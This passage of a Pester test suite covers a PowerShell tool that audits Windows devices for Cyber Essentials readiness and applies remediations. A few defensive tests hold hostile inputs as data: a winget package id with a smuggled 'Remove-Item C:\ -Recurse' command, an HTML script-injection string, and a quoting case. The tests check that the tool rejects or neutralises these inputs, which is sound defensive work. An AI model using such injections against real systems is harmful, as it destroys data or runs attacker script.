            )
            $rows = @(ConvertFrom-CEWingetTable -Lines $lines)
            ($rows | ForEach-Object { $_.Id }) -join ',' | Should -Be "7zip.7zip,Microsoft.VisualStudioCode,Contoso.SomeVeryLongApp$ell,Discord.Discord"
            $rows[0].Available | Should -Be '25.01'
            $rows[1].Name | Should -Be 'Microsoft Visual Studio Code (User)'
            $rows[2].Truncated | Should -BeTrue
            $rows[3].Version | Should -Be '1.0.9163'
            @($rows | Where-Object { $_.Name -match '^(Name|-+)' -or $_.Id -match '^-+$' }).Count | Should -Be 0
        }
    }

    It 'offers no automatic fix for a winget id that was shortened' {
        Set-TestDevice -Kind Insecure
        Mock -ModuleName CEAudit Get-CEWingetUpgrades {
            [pscustomobject]@{ Available = $true; Packages = @([pscustomobject]@{ Name = 'Long App'; Id = "Contoso.Lo$([char]0x2026)"; Version = '1'; Available = '2'; Source = 'winget'; Truncated = $true }) }
        }
        $f = @(Invoke-CEAuditCore -Id 'SU-05')
        $f[0].Status | Should -Be 'Fail'
        $f[0].Remediation | Should -BeNullOrEmpty
    }

    It 'returns nothing for "No installed package found"' {
        InModuleScope CEAudit {
            @(ConvertFrom-CEWingetTable -Lines @('No installed package found matching input criteria.')).Count | Should -Be 0
        }
    }
}

Describe 'Audit of an insecure device' {
    BeforeAll {
        Set-TestDevice -Kind Insecure
        $script:findings = @(Invoke-CEAuditCore)
        $script:byId = @{}
        foreach ($f in $script:findings) { $script:byId[$f.FindingId] = $f }
    }

    It 'produces no Error findings (every check handled its inputs)' {
        $errors = @($script:findings | Where-Object Status -eq 'Error')
        ($errors | ForEach-Object { "$($_.FindingId): $($_.Actual)" }) -join "`n" | Should -BeNullOrEmpty
    }

    It 'fails the firewall, autorun, lockout and PIN checks' {
        $script:byId['FW-01'].Status | Should -Be 'Fail'
        $script:byId['FW-02'].Status | Should -Be 'Fail'
        $script:byId['SC-05'].Status | Should -Be 'Fail'
        $script:byId['SC-07'].Status | Should -Be 'Fail'
        $script:byId['SC-08'].Status | Should -Be 'Fail'
    }

    It 'flags the risky public inbound rule and RDP without NLA' {
        $script:byId['FW-03:Old-game-server'].Status | Should -Be 'Warn'
        $script:byId['FW-04:NLA'].Status | Should -Be 'Fail'
    }

    It 'flags account problems' {
        $script:byId['SC-01'].Status | Should -Be 'Fail'
        $script:byId['SC-02'].Status | Should -Be 'Fail'
        $script:byId['SC-03:olduser'].Status | Should -Be 'Warn'
        $script:byId['SC-04:olduser'].Status | Should -Be 'Fail'
    }

    It 'detects the everyday account is an admin when elevated as the same user' {
        Set-TestDevice -Kind Insecure -ContextOverride @{ RunningAs = 'TESTPC\paul'; ConsoleUser = 'TESTPC\paul' }
        $f = @(Invoke-CEAuditCore -Id 'UA-01')[0]
        $f.Status | Should -Be 'Fail'
    }

    It 'detects a split-token admin when not elevated' {
        Set-TestDevice -Kind Insecure -ContextOverride @{ IsElevated = $false; RunningAs = 'TESTPC\paul' }
        $f = @(Invoke-CEAuditCore -Id 'UA-01')[0]
        $f.Status | Should -Be 'Fail'
        Set-TestDevice -Kind Insecure
    }

    It 'raises the auto-fail patching and app update findings' {
        $script:byId['SU-03:Overdue'].Status | Should -Be 'Fail'
        $script:byId['SU-03:Overdue'].AutoFail | Should -BeTrue
        $script:byId['SU-05:7zip-7zip'].Status | Should -Be 'Fail'
        $script:byId['SU-05:7zip-7zip'].AutoFail | Should -BeTrue
    }

    It 'flags end-of-life software' {
        $f = $script:findings | Where-Object { $_.CheckId -eq 'SU-06' -and $_.Subject -like 'Python 3.8*' }
        $f.Status | Should -Be 'Fail'
    }

    It 'flags disabled automatic updates and blocked Chrome updates' {
        $script:byId['SU-02:Automatic-updates'].Status | Should -Be 'Fail'
        $script:byId['SU-07:Google-Chrome'].Status | Should -Be 'Fail'
    }

    It 'flags malware protection gaps' {
        $script:byId['MP-01'].Status | Should -Be 'Fail'
        $script:byId['MP-02'].Status | Should -Be 'Fail'
        $script:byId['MP-03'].Status | Should -Be 'Fail'
        $script:byId['MP-05:Network-protection'].Status | Should -Be 'Fail'
        $script:byId['MP-10:Path-C'].Status | Should -Be 'Fail'
        $script:byId['MP-10:Extension-exe'].Status | Should -Be 'Fail'
        $script:findings | Where-Object { $_.FindingId -like 'MP-10:Path-C-Tools*' } | Should -BeNullOrEmpty
    }

    It 'marks MFA as needing attestation for detected cloud services' {
        $f = $script:findings | Where-Object { $_.CheckId -eq 'UA-07' -and $_.Subject -like 'Microsoft 365*' }
        $f.Status | Should -Be 'Manual'
    }

    It 'warns that Windows 11 24H2 Pro is close to end of servicing' {
        Set-TestDevice -Kind Insecure -ContextOverride @{ Build = 26100; DisplayVersion = '24H2' }
        Mock -ModuleName CEAudit Get-Date { [datetime]'2026-09-16' } -ParameterFilter { -not $Date -and -not $Format }
        $f = @(Invoke-CEAuditCore -Id 'SU-01') | Where-Object { -not $_.Subject }
        $f.Status | Should -Be 'Warn'
        $f.Actual | Should -Match '2026-10-13'
        Set-TestDevice -Kind Insecure
    }

    It 'fails Windows 10' {
        Set-TestDevice -Kind Insecure -ContextOverride @{ OSFamily = 'Windows 10'; Build = 19045 }
        $f = @(Invoke-CEAuditCore -Id 'SU-01') | Where-Object { -not $_.Subject }
        $f.Status | Should -Be 'Fail'
        $f.AutoFail | Should -BeTrue
        Set-TestDevice -Kind Insecure
    }

    It 'skips admin-only checks when not elevated' {
        Set-TestDevice -Kind Insecure -ContextOverride @{ IsElevated = $false }
        $f = @(Invoke-CEAuditCore -Id 'NC-01')[0]
        $f.Status | Should -Be 'Skipped'
        Set-TestDevice -Kind Insecure
    }

    It 'turns an exception inside a check into an Error finding' {
        Mock -ModuleName CEAudit Get-NetFirewallProfile { throw 'boom' }
        $f = @(Invoke-CEAuditCore -Id 'FW-01')[0]
        $f.Status | Should -Be 'Error'
        $f.Actual | Should -Match 'boom'
        Set-TestDevice -Kind Insecure
    }

    Context 'changeset' {
        BeforeAll {
            $script:cs = New-CEChangeset -Findings $script:findings -Context (New-TestContext)
        }

        It 'creates sequential item ids' {
            $script:cs.Items.Count | Should -BeGreaterThan 10
            $script:cs.Items[0].ItemId | Should -Be 'C001'
            ($script:cs.Items.ItemId | Sort-Object -Unique).Count | Should -Be $script:cs.Items.Count
        }

        It 'puts auto-fail fixes first' {
            $script:cs.Items[0].AutoFail | Should -BeTrue
            $firstNonAuto = [array]::IndexOf(@($script:cs.Items.AutoFail), $false)
            @($script:cs.Items | Select-Object -Skip $firstNonAuto | Where-Object AutoFail).Count | Should -Be 0
        }

        It 'merges findings that share a remediation' {
            $wu = @($script:cs.Items | Where-Object { $_.RemediationId -eq 'WindowsUpdate-InstallSecurity' })
            $wu.Count | Should -Be 1
        }

        It 'does not pre-select high-risk items' {
            $script:cs.Items | Where-Object Risk -eq 'High' | ForEach-Object { $_.Selected | Should -BeFalse }
        }

        It 'lists findings without automated fixes as manual actions' {
            $script:cs.ManualActions.FindingId | Should -Contain 'SC-09'
            $script:cs.ManualActions.FindingId | Should -Contain 'SU-06:Python-3-8-10-64-bit'
        }

        It 'round-trips through JSON' {
            $json = $script:cs | ConvertTo-Json -Depth 8
            $back = $json | ConvertFrom-Json
            $back.Items.Count | Should -Be $script:cs.Items.Count
            $back.SchemaVersion | Should -Be 1
        }
    }

    Context 'reports' {
        It 'writes json, markdown and html' {
            $out = Join-Path $TestDrive 'out'
            $r = Export-CEReport -Findings $script:findings -Context (New-TestContext) -OutputPath $out
            foreach ($p in $r.Paths.PSObject.Properties.Value) { Test-Path $p | Should -BeTrue }
            $r.Summary.Verdict | Should -Match '^FAIL'
            $fw = @($script:findings | Where-Object Category -eq 'Firewalls')
            $p = Export-CEReport -Findings $fw -Context (New-TestContext) -OutputPath (Join-Path $TestDrive 'out-partial') -PartialRun
            $p.Summary.Verdict | Should -Match '^PARTIAL: \d+ of 58 checks run$' -Because 'a partial run gives no FAIL/READY verdict even with failures'
            (Get-Content $r.Paths.Html -Raw) | Should -Match 'Cyber Essentials Plus readiness'
            (Get-Content $r.Paths.Markdown -Raw) | Should -Match 'Automatic-fail items'
            ($r.Summary.CEPlus | Where-Object TestCase -eq 'TC2').State | Should -Be 'Likely fail'
            ($r.Summary.CEPlus | Where-Object TestCase -eq 'TC5').State | Should -Be 'Likely fail'
        }

        It 'HTML-encodes finding text' {
            $f = @($script:findings)[0].PSObject.Copy()
            $f.Actual = '<script>alert(1)</script>'
            $out = Join-Path $TestDrive 'enc'
            $r = Export-CEReport -Findings @($f) -Context (New-TestContext) -OutputPath $out
            (Get-Content $r.Paths.Html -Raw) | Should -Not -Match '<script>alert'
        }
    }
}

Describe 'Audit of a hardened device' {
    BeforeAll {
        Set-TestDevice -Kind Secure
        $script:findings = @(Invoke-CEAuditCore)
    }

    It 'has no failures or errors' {
        $bad = @($script:findings | Where-Object { @('Fail', 'Error') -contains $_.Status })
        ($bad | ForEach-Object { "$($_.FindingId) [$($_.Status)] $($_.Actual)" }) -join "`n" | Should -BeNullOrEmpty
    }

    It 'does not claim READY for a partial run' {
        $f = @(Invoke-CEAuditCore -Id 'NC-08')
        $summary = InModuleScope CEAudit -Parameters @{ F = $f } { param($F) Get-CESummary -Findings $F -PartialRun }
        $summary.Verdict | Should -Be 'PARTIAL: 1 of 58 checks run'
        $summary.PartialRun | Should -BeTrue
        $out = Join-Path $TestDrive 'partial'
        $r = Export-CEReport -Findings $f -Context (New-TestContext) -OutputPath $out -PartialRun
        $r.Summary.Verdict | Should -Be 'PARTIAL: 1 of 58 checks run'
        (Get-Content $r.Paths.Html -Raw) | Should -Match ([regex]::Escape("<div class='msg'>PARTIAL: 1 of 58 checks run</div>"))
        (Get-Content $r.Paths.Markdown -Raw) | Should -Match ([regex]::Escape('## PARTIAL: 1 of 58 checks run'))
        # A check can run without leaving a finding, so the engine's count wins over the findings.
        $progress = @{}
        $f = @(Invoke-CEAuditCore -Id 'NC-08', 'NC-07' -ProgressState $progress)
        $progress.Done | Should -Be 2
        $r = Export-CEReport -Findings @($f | Where-Object CheckId -eq 'NC-08') -Context (New-TestContext) -OutputPath $out -PartialRun -ChecksRun $progress.Done
        $r.Summary.Verdict | Should -Be 'PARTIAL: 2 of 58 checks run'
    }

    It 'still asks for manual attestation (MFA, software review, backups)' {
        $summary = InModuleScope CEAudit -Parameters @{ F = $script:findings } { param($F) Get-CESummary -Findings $F }
        $summary.Verdict | Should -Match '^NEEDS REVIEW'
    }

    It 'passes once MFA is attested' {
        InModuleScope CEAudit {
            $cfg = Get-CEConfig
            $orig = $cfg.'cloud-services'
            try {
                $cfg.'cloud-services' = [pscustomobject]@{
                    maxAttestationAgeDays = 365
                    services = @([pscustomobject]@{ name = 'Microsoft 365 / Entra ID'; mfaEnforced = $true; adminMfaEnforced = $true; verifiedOn = (Get-Date).ToString('yyyy-MM-dd'); verifiedBy = 'IT admin' })
                    detectionHints = $orig.detectionHints
                }
                $f = @(Invoke-CEAuditCore -Id 'UA-07')
                $f.Status | Should -Be 'Pass'
            }
            finally { $cfg.'cloud-services' = $orig }
        }
    }

    It 'fails when a service is attested without MFA' {
        InModuleScope CEAudit {
            $cfg = Get-CEConfig
            $orig = $cfg.'cloud-services'
            try {
                $cfg.'cloud-services' = [pscustomobject]@{
                    maxAttestationAgeDays = 365
                    services = @([pscustomobject]@{ name = 'Xero'; mfaEnforced = $false; adminMfaEnforced = $false; verifiedOn = '2026-09-01'; verifiedBy = 'IT admin' })
                    detectionHints = @()
                }
                $f = @(Invoke-CEAuditCore -Id 'UA-07')
                $f.Status | Should -Be 'Fail'
                $f.AutoFail | Should -BeTrue
            }
            finally { $cfg.'cloud-services' = $orig }
        }
    }
}

Describe 'Remediation engine' {
    BeforeAll { Set-TestDevice -Kind Insecure }

    It 'refuses unknown remediation ids' {
        { Invoke-CERemediation -Id 'Evil-Thing' -Parameters @{} } | Should -Throw '*Unknown remediation*'
    }

    It 'rejects injected winget package ids' {
        { Invoke-CERemediation -Id 'Winget-Upgrade' -Parameters @{ PackageId = 'foo; Remove-Item C:\ -Recurse' } } | Should -Throw '*not allowed*'
    }

    It 'rejects optional features outside the allow list' {
        { Invoke-CERemediation -Id 'OptionalFeature-Disable' -Parameters @{ FeatureName = 'Microsoft-Hyper-V' } } | Should -Throw '*not one of*'
    }

    It 'rejects out-of-range lockout thresholds' {
        { Invoke-CERemediation -Id 'AccountLockout-Set' -Parameters @{ Threshold = 50; DurationMinutes = 10; WindowMinutes = 10 } } | Should -Throw '*outside*'
    }

    It 'rejects ASR rule ids that are not in config' {
        { Invoke-CERemediation -Id 'Defender-ASR' -Parameters @{ Mode = 'Block'; RuleIds = @('00000000-0000-0000-0000-000000000000') } } | Should -Throw
    }

    It 'requires elevation for machine changes' {
        Set-TestDevice -Kind Insecure -ContextOverride @{ IsElevated = $false }
        { Invoke-CERemediation -Id 'Autorun-Disable' } | Should -Throw '*elevated*'
        Set-TestDevice -Kind Insecure
    }

    It 'does nothing under -WhatIf' {
        Mock -ModuleName CEAudit Set-CERegistryValueTracked { throw 'should not be called' }
        $r = Invoke-CERemediation -Id 'Autorun-Disable' -WhatIf
        $r.Status | Should -Be 'WhatIf'
    }

    It 'records registry undo information' {
        InModuleScope CEAudit {
            Mock Get-CERegistryState { @{ Path = $Path; Name = $Name; Existed = $true; Value = 0; Kind = 'DWord' } }
            Mock Test-Path { $true }
            Mock New-ItemProperty { }
            $undo = New-Object System.Collections.Generic.List[object]
            Set-CERegistryValueTracked -Path 'HKLM:\X' -Name 'Y' -Value 1 -Undo $undo
            $undo.Count | Should -Be 1
            $undo[0].Existed | Should -BeTrue
            $undo[0].Value | Should -Be 0
            Should -Invoke New-ItemProperty -Times 1
        }
    }

    It 'skips registry writes that are already in the desired state' {
        InModuleScope CEAudit {
            Mock Get-CERegistryState { @{ Path = $Path; Name = $Name; Existed = $true; Value = 1; Kind = 'DWord' } }
            Mock New-ItemProperty { }
            $undo = New-Object System.Collections.Generic.List[object]
            Set-CERegistryValueTracked -Path 'HKLM:\X' -Name 'Y' -Value 1 -Undo $undo
            $undo.Count | Should -Be 0
            Should -Invoke New-ItemProperty -Times 0
        }
    }

    It 'applies a hardening remediation and returns its undo records' {
        InModuleScope CEAudit {
            Mock Get-CERegistryState { @{ Path = $Path; Name = $Name; Existed = $false; Value = $null; Kind = $null } }
            Mock Test-Path { $true }
            Mock New-ItemProperty { }
            $r = Invoke-CERemediation -Id 'Hardening-RestrictAnonymous'
            $r.Status | Should -Be 'Applied'
            @($r.Undo).Count | Should -Be 2
            $r.RequiresReboot | Should -BeTrue
        }
    }

    It 'quotes undo command literals safely' {
        InModuleScope CEAudit {
            ConvertTo-CEPSLiteral "it's; Remove-Item x" | Should -Be "'it''s; Remove-Item x'"
            ConvertTo-CEPSLiteral 5 | Should -Be '5'
            ConvertTo-CEPSLiteral $true | Should -Be '$true'
        }
    }

    It 'refuses to disable the built-in admin when it is the only admin' {
        InModuleScope CEAudit {
            Mock Get-LocalUser { [pscustomobject]@{ Name = 'Administrator'; SID = 'S-1-5-21-1-500'; Enabled = $true } }
            Mock Get-LocalGroupMember { [pscustomobject]@{ Name = 'PC\Administrator'; SID = 'S-1-5-21-1-500'; PrincipalSource = 'Local' } }
            Mock Disable-LocalUser { }
            $r = Invoke-CERemediation -Id 'LocalUser-DisableBySidSuffix' -Parameters @{ SidSuffix = 500 }
            $r.Status | Should -Be 'Failed'
            $r.Message | Should -Match 'no other enabled administrator'
            Should -Invoke Disable-LocalUser -Times 0
        }
    }
}

Describe 'Applying a changeset' {
    BeforeAll { Set-TestDevice -Kind Insecure }

    It 'skips admin-only items when not elevated and writes no undo log' {
        Set-TestDevice -Kind Insecure -ContextOverride @{ IsElevated = $false }
        $cs = Join-Path $TestDrive 'changeset.json'
        '{}' | Set-Content $cs
        $items = @([pscustomobject]@{ ItemId = 'C001'; Title = 'Autorun'; RemediationId = 'Autorun-Disable'; Parameters = @{}; RequiresAdmin = $true; RequiresReboot = $false; CheckIds = @('SC-05') })
        $r = Invoke-CEChangeset -Items $items -ChangesetPath $cs
        $r.Skipped | Should -Be 1
        $r.Applied | Should -Be 0
        $r.UndoPath | Should -BeNullOrEmpty
        Set-TestDevice -Kind Insecure
    }

    It 'applies items, writes an undo log and re-runs the related checks' {
        Mock -ModuleName CEAudit Get-CERegistryState { @{ Path = $Path; Name = $Name; Existed = $false; Value = $null; Kind = $null } }
        Mock -ModuleName CEAudit Test-Path { $true }
        Mock -ModuleName CEAudit New-ItemProperty { }
        $cs = Join-Path $TestDrive 'changeset.json'
        '{}' | Set-Content $cs
        $items = @([pscustomobject]@{ ItemId = 'C001'; Title = 'Autorun'; RemediationId = 'Autorun-Disable'; Parameters = @{}; RequiresAdmin = $true; RequiresReboot = $false; CheckIds = @('SC-05') })
        $r = Invoke-CEChangeset -Items $items -ChangesetPath $cs
        $r.Applied | Should -Be 1
        Test-Path $r.UndoPath | Should -BeTrue
        $log = Get-Content $r.UndoPath -Raw | ConvertFrom-Json
        @($log.Items[0].Undo).Count | Should -Be 3
        @($r.Verification).CheckId | Should -Contain 'SC-05'
        # @() matters: one result is a single object, which has no .Count in Windows PowerShell 5.1.
        @(Get-CEUndoLogs -OutputRoot $TestDrive).Count | Should -BeGreaterThan 0
    }

    It 'makes no changes and writes no log under -WhatIf' {
        Mock -ModuleName CEAudit New-ItemProperty { throw 'should not write' }
        $cs = Join-Path (Join-Path $TestDrive 'wi') 'changeset.json'
        New-Item -ItemType Directory -Path (Split-Path $cs) -Force | Out-Null
        '{}' | Set-Content $cs
        $items = @([pscustomobject]@{ ItemId = 'C001'; Title = 'Autorun'; RemediationId = 'Autorun-Disable'; Parameters = @{}; RequiresAdmin = $true; RequiresReboot = $false; CheckIds = @('SC-05') })
        $r = Invoke-CEChangeset -Items $items -ChangesetPath $cs -WhatIf
        $r.WhatIf | Should -BeTrue
        $r.UndoPath | Should -BeNullOrEmpty
        @(Get-ChildItem (Split-Path $cs) -Filter 'undo-*').Count | Should -Be 0
    }
}

Describe 'Desktop app result rendering' {
    # WPF isn't available everywhere, so load the app's functions and render
    # into stand-in controls. Catches PowerShell pitfalls in the UI code, such
    # as empty DataTables being unrolled to $null on return.
    BeforeAll {
        Set-TestDevice -Kind Insecure
        $f = @(Invoke-CEAuditCore)
        $script:guiOut = Join-Path $TestDrive 'gui'
        $rep = Export-CEReport -Findings $f -Context $global:CETestCtx -OutputPath $script:guiOut
        $script:guiResult = [pscustomobject]@{ Findings = $f; Context = $global:CETestCtx; Summary = $rep.Summary; Changeset = $rep.Changeset; Folder = $script:guiOut; Paths = $rep.Paths }

        $src = Get-Content (Join-Path $script:RepoRoot 'app\Start-CEAuditGui.ps1') -Raw
        $ast = [System.Management.Automation.Language.Parser]::ParseInput($src, [ref]$null, [ref]$null)
        $script:guiFunctions = @($ast.FindAll({ $args[0] -is [System.Management.Automation.Language.FunctionDefinitionAst] }, $false) | ForEach-Object { $_.Extent.Text })
    }

    It 'renders fresh and saved results without errors' {
        foreach ($fn in $script:guiFunctions) { . ([scriptblock]::Create($fn)) }
        function Get-Brush { 'brush' }
        function New-Tile { 'tile' }
        function New-CEFrameworkBar { param($Label, $Fraction, $Percent, $Deviation) 'bar' }
        function New-CEAiLine { param([string]$Text, [switch]$Bad) 'line' }
        function Set-CEStatusStack { param($CheckMap) }
        function New-CELegendItem { param([string]$Colour, [string]$Text) 'legend' }
        function Set-UiRichText { param($Block, [object[]]$Parts) $Block.Text = (@($Parts | ForEach-Object { $_['Text'] }) -join '') }
        function Set-UiTabHeader { param($Tab, [string]$Label, $Count) $Tab.Header = "$Label $Count" }
        function Set-UiTabsEnabled { param([bool]$On) }
        function Get-CEAiPosture { param($Context) [ordered]@{ agentsFound = 1; contained = $true; deviations = 0; agents = @([ordered]@{ name = 'Test agent'; elevated = $false; asSystem = $false; running = $true }); environments = @([ordered]@{ type = 'wsl'; name = 'Debian'; wslVersion = 2; defaultUidRoot = $false; autoMount = $true; networking = 'nat' }) } }
        # Read by the app functions via dynamic scope.
        Set-Variable -Name statusOrder -Value @('Pass', 'Fail', 'Warn', 'Manual', 'Skipped', 'NotApplicable', 'Error')
        Set-Variable -Name themeLabels -Value ([ordered]@{ Firewalls = 'Firewalls'; SecureConfiguration = 'Secure configuration'; SecurityUpdateManagement = 'Security update management'; UserAccessControl = 'User access control'; MalwareProtection = 'Malware protection'; NCSCHardening = 'NCSC hardening (beyond CE)' })
        $script:OutputRoot = $TestDrive
        $script:FindingScope = $null
        $ui = @{}
        foreach ($n in 'VerdictBanner', 'VerdictText', 'VerdictSub', 'TcGrid', 'ThemeGrid', 'FindingsGrid', 'ChangesGrid', 'ManualGrid', 'HistoryGrid', 'ChangesTab', 'ManualTab', 'HistoryTab', 'OpenReportBtn', 'OpenFolderBtn', 'FindingCount', 'SelCount') {
            $ui[$n] = [pscustomobject]@{ BorderBrush = $null; Text = ''; Foreground = $null; ItemsSource = $null; Header = ''; IsEnabled = $false }
        }
        $ui.Tiles = [pscustomobject]@{ Children = (New-Object System.Collections.ArrayList) }
        $ui.FwBars = [pscustomobject]@{ Children = (New-Object System.Collections.ArrayList) }
        $ui.AiAgentsGrid = [pscustomobject]@{ ItemsSource = $null; Visibility = '' }
        $ui.AiAgentsEmpty = [pscustomobject]@{ Visibility = '' }
        $ui.AiMcpGrid = [pscustomobject]@{ ItemsSource = $null; Visibility = '' }
        $ui.AiMcpEmpty = [pscustomobject]@{ Visibility = '' }
        $ui.AiMcpMeta = [pscustomobject]@{ Text = '' }
        $ui.AiEnvs = [pscustomobject]@{ Children = (New-Object System.Collections.ArrayList) }
        $ui.AiControlsLink = [pscustomobject]@{ Text = '' }
        $ui.AiLine = [pscustomobject]@{ Visibility = '' }
        $ui.AiLineText = [pscustomobject]@{ Text = '' }
        $ui.ActMeta = [pscustomobject]@{ Text = '' }
        $ui.OvEmpty = [pscustomobject]@{ Visibility = '' }
        $ui.OvBody = [pscustomobject]@{ Visibility = '' }
        $ui.StatusStack = [pscustomobject]@{ Child = $null }
        $ui.StatusLegend = [pscustomobject]@{ Children = (New-Object System.Collections.ArrayList) }
        $ui.ThemeFilter = [pscustomobject]@{ SelectedValue = '(all)' }
        $ui.StatusFilter = [pscustomobject]@{ SelectedValue = 'Needs action' }
        $ui.SearchBox = [pscustomobject]@{ Text = '' }

        Show-Results $script:guiResult
        $ui.TcGrid.ItemsSource.Count | Should -Be 5
        $ui.FindingCount.Text | Should -Match 'shown'
        $ui.SelCount.Text | Should -Match 'ticked'
        $ui.AiLine.Visibility | Should -Be 'Visible'
        $ui.AiLineText.Text | Should -Match 'AI tool'
        $ui.OvBody.Visibility | Should -Be 'Visible'
        $ui.VerdictText.Text | Should -Not -BeNullOrEmpty
        $ui.ChangesTab.Header | Should -Match '^Fixes \d+$'
        $ui.FwBars.Children.Count | Should -Be 3
        @($ui.AiAgentsGrid.ItemsSource).Count | Should -BeGreaterThan 0
        $ui.AiMcpEmpty.Visibility | Should -Be 'Visible'
        $ui.AiControlsLink.Text | Should -Match 'AI-related control'

        Show-Results (Import-SavedResults (Join-Path $script:guiOut 'findings.json'))
        $ui.ChangesGrid.ItemsSource.Count | Should -Be @($script:guiResult.Changeset.Items).Count
    }
}

Describe 'Desktop app: choosing checks' {
    BeforeAll {
        Set-TestDevice -Kind Secure
        $src = Get-Content (Join-Path $script:RepoRoot 'app\Start-CEAuditGui.ps1') -Raw
        $ast = [System.Management.Automation.Language.Parser]::ParseInput($src, [ref]$null, [ref]$null)
        $script:guiFunctions = @($ast.FindAll({ $args[0] -is [System.Management.Automation.Language.FunctionDefinitionAst] }, $false) | ForEach-Object { $_.Extent.Text })
        $script:allIds = @(Get-CECheck | ForEach-Object { $_.Id } | Sort-Object)
        $script:ceIds = @(Get-CECheck -Framework 'CE' | ForEach-Object { $_.Id } | Sort-Object)
    }
    BeforeEach {
        foreach ($fn in $script:guiFunctions) { . ([scriptblock]::Create($fn)) }
        $script:UiSettingsPath = Join-Path $TestDrive "settings-$([guid]::NewGuid().ToString('n')).json"
        function Write-UiLog { param($Text) }
    }

    It 'resolves ticked checks to All, the Cyber Essentials preset, or a custom choice' {
        (Resolve-UiCheckSelection -Ids $script:allIds).Mode | Should -Be 'All'
        (Resolve-UiCheckSelection -Ids $script:ceIds).Mode | Should -Be 'CE'
        $custom = Resolve-UiCheckSelection -Ids @('UA-10', 'FW-01', 'FW-01', 'XX-99')
        $custom.Mode | Should -Be 'Custom'
        $custom.Ids | Should -Be @('FW-01', 'UA-10') -Because 'duplicates and unknown ids are dropped, and ids are sorted'
        (Resolve-UiCheckSelection -Ids @()).Mode | Should -Be 'Custom'
        @((Resolve-UiCheckSelection -Ids @()).Ids).Count | Should -Be 0
    }

    It 'works out theme tick boxes: all, none or partly ticked' {
        $ids = @('FW-01', 'FW-02', 'FW-03')
        Get-UiThemeTickState -ThemeIds $ids -Ticked @{ 'FW-01' = $true; 'FW-02' = $true; 'FW-03' = $true } | Should -BeTrue
        Get-UiThemeTickState -ThemeIds $ids -Ticked @{ 'FW-01' = $false } | Should -BeFalse
        Get-UiThemeTickState -ThemeIds $ids -Ticked @{ 'FW-02' = $true } | Should -BeNullOrEmpty
    }

    It 'describes the choice for the toolbar' {
        Get-UiSelectionText ([pscustomobject]@{ Mode = 'All'; Ids = $script:allIds }) | Should -Be "All $($script:allIds.Count) checks"
        Get-UiSelectionText ([pscustomobject]@{ Mode = 'CE'; Ids = $script:ceIds }) | Should -Be "Cyber Essentials only ($($script:ceIds.Count) checks)"
        Get-UiSelectionText ([pscustomobject]@{ Mode = 'Custom'; Ids = @('FW-01', 'UA-10') }) | Should -Be "2 of $($script:allIds.Count) checks"
    }

    It 'groups checks by control theme in report order' {
        $groups = Get-UiCheckGroup
        ($groups | ForEach-Object { $_.Id }) | Should -Be @('Firewalls', 'SecureConfiguration', 'SecurityUpdateManagement', 'UserAccessControl', 'MalwareProtection', 'NCSCHardening')
        @($groups | ForEach-Object { $_.Checks } | ForEach-Object { $_.Id }).Count | Should -Be $script:allIds.Count
        ($groups[0].Checks | ForEach-Object { $_.Id }) | Should -Be @('FW-01', 'FW-02', 'FW-03', 'FW-04', 'FW-05', 'FW-06', 'FW-07')
    }

    It 'saves and reloads the choice, dropping checks that no longer exist' {
        (Read-UiCheckSelection).Mode | Should -Be 'All' -Because 'there is no settings file yet'
        Save-UiCheckSelection ([pscustomobject]@{ Mode = 'Custom'; Ids = @('FW-01', 'UA-10') })
        $back = Read-UiCheckSelection
        $back.Mode | Should -Be 'Custom'
        $back.Ids | Should -Be @('FW-01', 'UA-10')

        Save-UiCheckSelection ([pscustomobject]@{ Mode = 'CE'; Ids = $script:ceIds })
        (Read-UiCheckSelection).Mode | Should -Be 'CE'

        Set-Content -LiteralPath $script:UiSettingsPath -Value '{ "checkSelection": { "mode": "Custom", "ids": ["ZZ-01", "ZZ-02"] } }'
        (Read-UiCheckSelection).Mode | Should -Be 'All' -Because 'a choice with no known checks falls back to all'
        Set-Content -LiteralPath $script:UiSettingsPath -Value '{ not json'
        (Read-UiCheckSelection).Mode | Should -Be 'All'
    }

    It 'the chooser window layout is valid XAML' {
        $src = Get-Content (Join-Path $script:RepoRoot 'app\Start-CEAuditGui.ps1') -Raw
        $start = $src.IndexOf("`$chooserXaml = @'") + 17
        $end = $src.IndexOf("'@", $start)
        [xml]$doc = $src.Substring($start, $end - $start).Trim()
        foreach ($n in 'AllBtn', 'CeBtn', 'ClearBtn', 'SearchBox', 'CancelBtn', 'OkBtn', 'CountText', 'AdminText', 'Tree') {
            @($doc.SelectNodes("//*[@*[local-name()='Name']='$n']")).Count | Should -Be 1 -Because "Show-CheckChooser looks up $n"
        }
    }
}

Describe 'Intune: status, discovery and compliance rules' {
    BeforeAll {
        $script:intune = Join-Path $script:RepoRoot 'intune'
        . (Join-Path $script:intune 'Discover-CECompliance.ps1')
        $script:strictRules = Join-Path $script:intune 'compliance-rules.json'
        $script:softRules = Join-Path $script:intune 'compliance-rules-autofail-only.json'
        $script:fwRules = Join-Path $script:intune 'compliance-rules-frameworks.json'

        function global:New-TestStatus {
            param([string]$Kind, [string]$DataRoot, [switch]$AttestMfa)
            Set-TestDevice -Kind $Kind
            if ($AttestMfa) {
                InModuleScope CEAudit {
                    $cfg = Get-CEConfig
                    $cfg.'cloud-services' = [pscustomobject]@{
                        maxAttestationAgeDays = 365
                        services = @([pscustomobject]@{ name = 'Microsoft 365 / Entra ID'; mfaEnforced = $true; adminMfaEnforced = $true; verifiedOn = (Get-Date).ToString('yyyy-MM-dd'); verifiedBy = 'IT' })
                        detectionHints = $cfg.'cloud-services'.detectionHints
                    }
                }
            }
            $f = @(Invoke-CEAuditCore)
            $summary = Get-CESummary -Findings $f
            $status = ConvertTo-CEStatus -Findings $f -Summary $summary -Context $global:CETestCtx -ReportFolder 'X'
            New-Item -ItemType Directory -Path $DataRoot -Force | Out-Null
            Write-CEStatus -Status $status -Path (Join-Path $DataRoot 'status.json') | Out-Null
            if ($AttestMfa) { InModuleScope CEAudit { Get-CEConfig -Force | Out-Null } }
            return $status
        }
    }

    It 'builds a status document with worst status per check' {
        $root = Join-Path $TestDrive 'insecure'
        $st = New-TestStatus -Kind Insecure -DataRoot $root
        $st.schemaVersion | Should -Be 1
        $st.autoFailCount | Should -BeGreaterThan 0
        $st.checks.'SU-05'.status | Should -Be 'Fail'
        $st.checks.'SU-05'.scope | Should -Be 'Machine'
        $st.checks.'UA-07'.status | Should -Be 'Manual'
        $st.frameworks.'ce-v3.3'.metPct | Should -BeLessThan 100
        $st.autoFails | Should -Contain 'SU-03'
        (Get-Content (Join-Path $root 'status.json') -Raw | ConvertFrom-Json).autoFailCount | Should -Be $st.autoFailCount
    }

    It 'derives per-framework rollups from self-describing checks and carries no verdict' {
